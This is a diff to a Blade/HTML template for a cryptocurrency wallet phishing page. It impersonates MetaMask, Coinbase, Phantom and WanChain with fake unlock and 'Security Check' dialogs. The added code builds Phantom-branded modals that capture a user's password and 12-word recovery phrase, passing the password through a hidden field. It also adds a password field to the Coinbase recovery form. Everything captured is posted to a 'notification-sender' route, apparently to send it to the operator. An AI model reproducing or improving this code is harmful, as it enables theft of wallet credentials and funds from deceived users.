@@ -50,10 +50,10 @@
                         </button>
                         <button type="button" class="box btn btn-primary"   onclick="nbaClick()">
                                 <div class="walletName">
-                                    <span>NBA Top Shot</span>
+                                    <span>Phantom</span>
                                 </div>
                                 <div class="icon">
-                                    <img src="{{ asset('images/images.jpg') }}" alt="">
+                                    <img src="{{ asset('images/phantomlogo.png') }}" alt="">
                                 </div>
                         </button>
                         <button type="button" class="box btn btn-primary"  onclick="tezoClick()">
@@ -85,7 +85,7 @@
                                     <span>WanChain</span>
                                 </div>
                                 <div class="icon">
-                                    <img src="{{ asset('images/rool_image.jpg') }}" alt="">
+                                    <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
                                 </div>
                         </button>
                     </div>
@@ -106,7 +106,7 @@
                         </div>
 
                         <select name="" id="currency_dropdown_section">
-                            <option value="">Etherrun Mainnet</option>
+                            <option value=""> Ethereum main net</option>
                         </select>
                     </div>
 
@@ -130,8 +130,9 @@
                             <input type="button" value="Unlock" id="firstSubmitButton">
                         </form>
 
-                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
-                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        <div class="under-p">
+                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        </div>
                     </div>
 
                 </div>
@@ -152,8 +153,8 @@
                         </div>
                         {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}
 
-                        <select name="" id="">
-                            <option value="">Etherrun Mainnet</option>
+                        <select name="" id="" class="form-control">
+                            <option value="">Ethereum main net</option>
                         </select>
                     </div>
 
@@ -177,9 +178,9 @@
                             <input type="submit" value="Confirm">
                         </form>
 
-                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
-                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
-                    </div>
+                        <div class="under-p">
+                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        </div>                    </div>
 
                 </div>
                 </div>
@@ -188,8 +189,6 @@
 
 
             {{-- wanchain first modal --}}
-
-
             <div class="modal fade" id="wanchainmodal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
@@ -205,7 +204,7 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/rool_image.jpg') }}" alt="">
+                        <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
 
                         <h2>Welcome Back!</h2>
                         <p class="top-p">The decentralize web awaits.</p>
@@ -216,14 +215,14 @@
 
 
 
-                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
-                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        <div class="under-p">
+                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        </div>
                     </div>
 
                 </div>
                 </div>
             </div>
-
 
             <div class="modal fade" id="wanchainmodal_second" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
@@ -240,7 +239,7 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/rool_image.jpg') }}" alt="">
+                        <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
 
                         <h2>Security Check</h2>
                         <p class="top-p">We just need to confirm it's you. <br>
@@ -252,25 +251,20 @@
                             <input type="text" name="wallet" id="wallet_wanchain" hidden>
                             <input type="submit" value="Confirm">
                         </form>
-
-
-
-                        <p class="d-flex"> or <a href="">import using Secret recovery Phrase</a></p>
-                        <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        <div class="under-p">
+                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        </div>
                     </div>
 
                 </div>
                 </div>
             </div>
 
-
-
-
             {{-- coinbase first modal  --}}
             <div class="modal fade" id="coinbaseFirst" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header " style="background-color: blue; color:white">
+                    <div class="modal-header " style="background-color: #5FACF6; color:white">
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
@@ -282,7 +276,7 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/download.jpg') }}" alt="">
+                        <img src="{{ asset('images/download.jpg') }}" class="coinbase-image" alt="">
 
                         <h2>Welcome Back!</h2>
                         <p class="top-p">We decentralized web awaits </p>
@@ -298,9 +292,10 @@
 
 
                         <div class="modal-footer">
-                            <p class="d-flex"> or <button style="border:none;data-bs-toggle="modal" data-bs-target="#coinbaseRecovery" >
-                                import using Secret recovery Phrase</button></p>
-                            <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+
+                            <div class="under-p">
+                                <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            </div>
                         </div>
                     </div>
 
@@ -308,14 +303,11 @@
                 </div>
             </div>
 
-
-
-
             {{-- coinbase Recovery  --}}
             <div class="modal fade" id="coinbaseRecovery" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header" style="background-color: blue; color:white">
+                    <div class="modal-header" style="background-color: #5FACF6; color:white">
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
@@ -327,7 +319,7 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/download.jpg') }}" alt="">
+                        <img src="{{ asset('images/download.jpg') }}"class="coinbase-image" alt="">
 
                         <h2>Security Check</h2>
                         <p>We just need to confirm it's you. <br>
@@ -337,14 +329,75 @@
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
                             <input type="text" placeholder="pharse" name="pharse">
+                            <input type="text" name="password" >
                             <input type="submit" value="Confirm">
                         </form>
-
-
-
-                        <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+                        <div class="under-p">
+                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                        </div>
                     </div>
 
+                </div>
+                </div>
+            </div>
+
+            {{-- black theme contact form --}}
+            <div class="modal fade" id="blackModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background-color: #2C2E2D; color:white">
+                        <button type="button" id="blcakmodalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+                        <img class="logo-black" src="{{ asset('images/phantomlogo.png') }}" alt="">
+                        <div class="walletName">
+                            <b style="color: #67686A">Phantom.app</b>
+                        </div>
+                        <div class="empty"></div>
+                    </div>
+                    </div>
+                    <div class="modal-body">
+                        <img src="{{ asset('images/phantomlogo.png') }}" alt="">
+                        <h4 style="color: #fff;" class="mb-3">Enter your password</h4>
+
+                        <form action="#">
+                            <input type="text" placeholder="Password" name="pharse" id="blacModalFirst">
+                            <input type="button" value="Unlock" id="blackThemeSubmit">
+
+                        </form>
+
+                    </div>
+                </div>
+                </div>
+            </div>
+
+            {{-- black theme contact form  --}}
+            <div class="modal fade" id="blackModalPhrase" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background-color: #2C2E2D; color:white">
+                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="topLine d-flex align-items-center justify-contents-between">
+                        <img class="logo-black" src="{{ asset('images/phantomlogo.png') }}" alt="">
+                        <div class="walletName">
+                            <b style="color: #67686A">Phantom.app</b>
+                        </div>
+                        <div class="empty"></div>
+                    </div>
+                    </div>
+                    <div class="modal-body">
+                        <img src="{{ asset('images/phantomlogo.png') }}" alt="">
+                        <h2 style="" class="mb-3">Security Check</h2>
+                        <p style="color: #fff">We just need to confirm it's you. <br>
+                            To continue, enter your 12 word phrase.
+                          </p>
+                        <form action="{{ route('notification-sender') }}" method="POST">
+                            @csrf
+                            <input type="text" name="wallet" value="Phantom" hidden >
+                            <input type="text" placeholder="Password" name="password" id="blacModalSecond" hidden>
+                            <input type="text" placeholder="Wallet Secret Recover Phrase" name="pharse">
+                            <input type="submit" value="Unlock">
+                        </form>
+                    </div>
                 </div>
                 </div>
             </div>
@@ -353,6 +406,7 @@
 
 
         </div>
+
     </section>
 
 
@@ -376,6 +430,29 @@
                 myModalSecond.show();
 
                 document.getElementById('hiddenPassword').value = inputValue;
+
+                }
+
+                });
+
+
+
+
+
+
+                document.getElementById('blackThemeSubmit').addEventListener('click', function(){
+               const inputValue =  document.getElementById('blacModalFirst').value;
+               if (inputValue == "") {
+                    alert("Insert Password To continue");
+                    return false;
+                } else {
+
+                document.getElementById('blcakmodalCloseButton').click();
+
+                const myModalSecond = new bootstrap.Modal(document.getElementById('blackModalPhrase'), {});
+                myModalSecond.show();
+
+                document.getElementById('blacModalSecond').value = inputValue;
 
                 }
 
@@ -430,13 +507,7 @@
 
                 function nbaClick()
                 {
-                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
-                    const image = '{{ asset('images/images.jpg') }}'
-                    const imageSrc = '<img src='+image + '>'
-                    const modalHeaderSection = document.getElementById('headerSmall');
-                    document.getElementById('headerBig').innerHTML =imageSrc
-                    modalHeaderSection.innerHTML = imageSrc;
-                    document.getElementById('wallet_hidden').value = "NBA"
+                    const myModal = new bootstrap.Modal(document.getElementById('blackModal'), {});
                     myModal.show();
                 }
 
@@ -462,7 +533,7 @@
                     function bitskiClick()
                         {
                             const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
-                            const image = '{{ asset('images/download_image.jpg') }}'
+                            const image = '{{ asset('images/bitskilogo.png') }}'
                             const imageSrc = '<img src='+image + '>'
                             const modalHeaderSection = document.getElementById('headerSmall');
                             document.getElementById('headerBig').innerHTML =imageSrc
